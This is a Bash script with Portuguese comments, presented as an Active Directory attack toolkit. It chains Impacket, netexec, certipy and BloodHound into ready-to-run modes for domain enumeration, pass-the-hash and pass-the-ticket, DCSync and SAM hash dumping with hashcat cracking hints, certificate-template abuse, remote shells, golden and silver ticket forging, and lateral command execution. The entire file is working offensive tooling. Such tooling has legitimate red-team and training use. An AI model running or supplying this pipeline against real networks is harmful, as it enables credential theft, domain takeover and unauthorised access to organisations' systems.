#!/usr/bin/env bash
# V0rtexOS — Active Directory Attack Toolkit
# Pipeline de ataques a ambientes Windows/AD
# Uso: ad-attack.sh <modo> [args]

set -euo pipefail

RED='\033[1;31m' GRN='\033[1;32m' CYN='\033[1;36m' YEL='\033[1;33m' RST='\033[0m'
ok()  { echo -e "${GRN}[+]${RST} $*"; }
log() { echo -e "${CYN}[*]${RST} $*"; }
err() { echo -e "${RED}[!]${RST} $*"; }

IMP="/opt/vortex/impacket/examples"
LOOT="/tmp/aeternus-loot"
mkdir -p "$LOOT"

# ── Enumeração inicial do domínio ─────────────────
enum_domain() {
    local domain="${1:?}" dc="${2:?}" user="${3:?}" pass="${4:?}"
    log "Enumerando domínio $domain via $dc"

    log "→ Usuários do domínio"
    python3 "$IMP/GetADUsers.py" "$domain/$user:$pass" \
        -dc-ip "$dc" -all 2>/dev/null \
        | tee "$LOOT/domain-users.txt"

    log "→ Grupos do domínio"
    netexec smb "$dc" -u "$user" -p "$pass" -d "$domain" \
        --groups 2>/dev/null | tee "$LOOT/domain-groups.txt"

    log "→ Domain Controllers"
    netexec smb "$dc" -u "$user" -p "$pass" -d "$domain" \
        --dc-list 2>/dev/null | tee "$LOOT/dcs.txt"

    log "→ Shares SMB"
    netexec smb "$dc" -u "$user" -p "$pass" -d "$domain" \
        --shares 2>/dev/null | tee "$LOOT/smb-shares.txt"

    log "→ GPOs"
    netexec smb "$dc" -u "$user" -p "$pass" -d "$domain" \
        --gpo-id 2>/dev/null | tee "$LOOT/gpos.txt"

    ok "Enumeração concluída. Dados em $LOOT/"
}

# ── Pass-the-Hash ─────────────────────────────────
pth() {
    local target="${1:?}" domain="${2:?}" user="${3:?}" hash="${4:?}"
    log "Pass-the-Hash: $domain/$user via $target"
    python3 "$IMP/wmiexec.py" \
        -hashes ":$hash" \
        "$domain/$user@$target"
}

# ── Pass-the-Ticket ───────────────────────────────
ptt() {
    local ticket="${1:?Caminho para .ccache}"
    log "Pass-the-Ticket: importando $ticket"
    export KRB5CCNAME="$ticket"
    log "KRB5CCNAME=$ticket"
    log "Use: python3 $IMP/psexec.py -k -no-pass <user>@<host>"
}

# ── Over-Pass-the-Hash (request TGT com NTLM) ─────
opth() {
    local domain="${1:?}" dc="${2:?}" user="${3:?}" hash="${4:?}"
    log "Over-Pass-the-Hash → TGT para $domain/$user"
    python3 "$IMP/getTGT.py" "$domain/$user" \
        -hashes ":$hash" \
        -dc-ip "$dc"
    ok "TGT gerado. Importe com: export KRB5CCNAME=$user.ccache"
}

# ── DCSync (dump de hashes via DRS) ───────────────
dcsync() {
    local domain="${1:?}" dc="${2:?}" user="${3:?}" pass="${4:?}"
    log "DCSync — dumping hashes via DRS de $dc"
    python3 "$IMP/secretsdump.py" \
        "$domain/$user:$pass@$dc" \
        -just-dc-ntlm \
        -outputfile "$LOOT/dcsync-hashes" 2>/dev/null
    ok "Hashes em $LOOT/dcsync-hashes.ntds"
    ok "Quebre com: hashcat -m 1000 $LOOT/dcsync-hashes.ntds /opt/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt"
}

# ── Dump SAM/LSA remoto ───────────────────────────
dump_sam() {
    local target="${1:?}" domain="${2:?}" user="${3:?}" pass="${4:?}"
    log "Dump SAM/LSA de $target"
    python3 "$IMP/secretsdump.py" \
        "$domain/$user:$pass@$target" \
        -outputfile "$LOOT/sam-$target" 2>/dev/null
    ok "SAM dump em $LOOT/sam-$target.*"
}

# ── BloodHound Collection ──────────────────────────
bloodhound_collect() {
    local domain="${1:?}" dc="${2:?}" user="${3:?}" pass="${4:?}"
    log "BloodHound — coletando dados do AD"
    bloodhound-python \
        -d "$domain" \
        -u "$user" -p "$pass" \
        -ns "$dc" \
        -c All \
        --zip \
        -o "$LOOT/bloodhound/" 2>/dev/null
    ok "BloodHound data em $LOOT/bloodhound/"
    ok "Importe no BloodHound GUI (neo4j) para visualização de caminhos de ataque"
}

# ── AD CS — Certificate abuse (Certipy) ───────────
adcs_attack() {
    local domain="${1:?}" dc="${2:?}" user="${3:?}" pass="${4:?}"
    log "AD CS — Enumerando Certificate Templates vulneráveis"
    certipy find \
        -u "$user@$domain" \
        -p "$pass" \
        -dc-ip "$dc" \
        -stdout 2>/dev/null | tee "$LOOT/adcs-templates.txt"

    log "Verificando ESC1-ESC8..."
    certipy find \
        -u "$user@$domain" \
        -p "$pass" \
        -dc-ip "$dc" \
        -vulnerable -stdout 2>/dev/null | tee "$LOOT/adcs-vulnerable.txt"

    if grep -q "ESC" "$LOOT/adcs-vulnerable.txt" 2>/dev/null; then
        ok "Templates vulneráveis encontrados! Exploite com certipy req"
    fi
}

# ── Impacket PSExec ───────────────────────────────
psexec_shell() {
    local target="${1:?}" domain="${2:?}" user="${3:?}" pass="${4:?}"
    log "PSExec → shell em $target"
    python3 "$IMP/psexec.py" "$domain/$user:$pass@$target"
}

# ── WMIExec (sem drop de arquivo) ─────────────────
wmiexec_shell() {
    local target="${1:?}" domain="${2:?}" user="${3:?}" pass="${4:?}"
    log "WMIExec → shell em $target"
    python3 "$IMP/wmiexec.py" "$domain/$user:$pass@$target"
}

# ── SMBExec ───────────────────────────────────────
smbexec_shell() {
    local target="${1:?}" domain="${2:?}" user="${3:?}" pass="${4:?}"
    log "SMBExec → shell em $target"
    python3 "$IMP/smbexec.py" "$domain/$user:$pass@$target"
}

# ── Golden Ticket ─────────────────────────────────
golden_ticket() {
    local domain="${1:?}" sid="${2:?}" krbtgt_hash="${3:?}" user="${4:-Administrator}"
    log "Forjando Golden Ticket para $domain/$user"
    python3 "$IMP/ticketer.py" \
        -nthash "$krbtgt_hash" \
        -domain-sid "$sid" \
        -domain "$domain" \
        "$user"
    ok "Golden Ticket: ${user}.ccache"
    ok "Use: export KRB5CCNAME=${user}.ccache"
}

# ── Silver Ticket ─────────────────────────────────
silver_ticket() {
    local domain="${1:?}" sid="${2:?}" service_hash="${3:?}" \
          target="${4:?}" spn="${5:?}" user="${6:-Administrator}"
    log "Forjando Silver Ticket para $spn@$target"
    python3 "$IMP/ticketer.py" \
        -nthash "$service_hash" \
        -domain-sid "$sid" \
        -domain "$domain" \
        -spn "$spn/$target" \
        "$user"
    ok "Silver Ticket: ${user}.ccache"
}

# ── Lateral Movement via netexec ──────────────────
lateral_move() {
    local targets="${1:?}" domain="${2:?}" user="${3:?}" pass="${4:?}" cmd="${5:-whoami}"
    log "Movimento lateral em $targets — Comando: $cmd"
    netexec smb "$targets" \
        -u "$user" -p "$pass" -d "$domain" \
        -x "$cmd" \
        --no-bruteforce \
        2>/dev/null | tee "$LOOT/lateral-$(date +%H%M%S).txt"
}

usage() {
    echo -e "\n${CYN}V0rtexOS — AD Attack Toolkit${RST}"
    echo
    echo "Modos:"
    echo "  enum-domain  <domain> <dc_ip> <user> <pass>"
    echo "  pth          <target> <domain> <user> <ntlm_hash>"
    echo "  ptt          <ccache_file>"
    echo "  opth         <domain> <dc_ip> <user> <ntlm_hash>"
    echo "  dcsync       <domain> <dc_ip> <user> <pass>"
    echo "  dump-sam     <target> <domain> <user> <pass>"
    echo "  bloodhound   <domain> <dc_ip> <user> <pass>"
    echo "  adcs         <domain> <dc_ip> <user> <pass>"
    echo "  psexec       <target> <domain> <user> <pass>"
    echo "  wmiexec      <target> <domain> <user> <pass>"
    echo "  smbexec      <target> <domain> <user> <pass>"
    echo "  golden       <domain> <sid> <krbtgt_hash> [user]"
    echo "  silver       <domain> <sid> <svc_hash> <target> <spn> [user]"
    echo "  lateral      <targets_file> <domain> <user> <pass> [cmd]"
    echo
}

case "${1:-help}" in
    enum-domain) shift; enum_domain "$@" ;;
    pth)         shift; pth "$@" ;;
    ptt)         shift; ptt "$@" ;;
    opth)        shift; opth "$@" ;;
    dcsync)      shift; dcsync "$@" ;;
    dump-sam)    shift; dump_sam "$@" ;;
    bloodhound)  shift; bloodhound_collect "$@" ;;
    adcs)        shift; adcs_attack "$@" ;;
    psexec)      shift; psexec_shell "$@" ;;
    wmiexec)     shift; wmiexec_shell "$@" ;;
    smbexec)     shift; smbexec_shell "$@" ;;
    golden)      shift; golden_ticket "$@" ;;
    silver)      shift; silver_ticket "$@" ;;
    lateral)     shift; lateral_move "$@" ;;
    *)           usage ;;
esac
